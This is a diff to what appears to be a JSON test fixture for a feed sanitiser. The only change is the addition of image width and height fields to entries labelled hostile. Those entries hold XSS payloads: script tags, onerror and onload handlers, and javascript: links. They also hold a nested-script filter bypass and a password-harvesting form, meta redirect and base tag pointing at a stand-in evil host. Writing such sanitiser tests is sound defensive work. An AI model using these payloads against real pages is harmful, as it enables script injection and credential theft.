@@ -14,7 +14,9 @@
         "publishedAt": 1794301200,
         "contentHtml": "\n        <p>Hello</p>\n        <script>window.__pwned = 'script'</script>\n        <img src=\"x\" onerror=\"window.__pwned = 'img'\">\n        <a href=\"javascript:window.__pwned='href'\">js link</a>\n        <iframe src=\"https://evil.example.test/frame\"></iframe>\n        <svg onload=\"window.__pwned='svg'\"><script>window.__pwned='svgscript'</script></svg>\n        <form action=\"https://evil.example.test/steal\"><input name=\"pw\" type=\"password\"></form>\n        <style>body{display:none}</style>\n        <meta http-equiv=\"refresh\" content=\"0;url=https://evil.example.test/\">\n        <base href=\"https://evil.example.test/\">\n        <object data=\"https://evil.example.test/x.swf\"></object>\n        <div style=\"background:url(javascript:alert(1))\">styled</div>\n        <a href=\"https://ok.example.test/\" target=\"_blank\">target blank without rel</a>\n      ",
         "summary": "click",
-        "imageUrl": null
+        "imageUrl": null,
+        "imageWidth": null,
+        "imageHeight": null
       },
       {
         "guidKey": "hostile-2",
@@ -25,7 +27,9 @@
         "publishedAt": 1794297600,
         "contentHtml": "<scr<script>ipt>alert('nested')</scr</script>ipt> &lt;script&gt;alert('double')&lt;/script&gt;",
         "summary": "<scr ipt> <script>alert('double')</script>",
-        "imageUrl": null
+        "imageUrl": null,
+        "imageWidth": null,
+        "imageHeight": null
       },
       {
         "guidKey": "hostile-3",
@@ -36,7 +40,9 @@
         "publishedAt": 1794294000,
         "contentHtml": "<a href=\"https://hostile.example.test/#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\">long fragment</a>",
         "summary": "long fragment",
-        "imageUrl": null
+        "imageUrl": null,
+        "imageWidth": null,
+        "imageHeight": null
       }
     ],
     "stoppedEarly": false
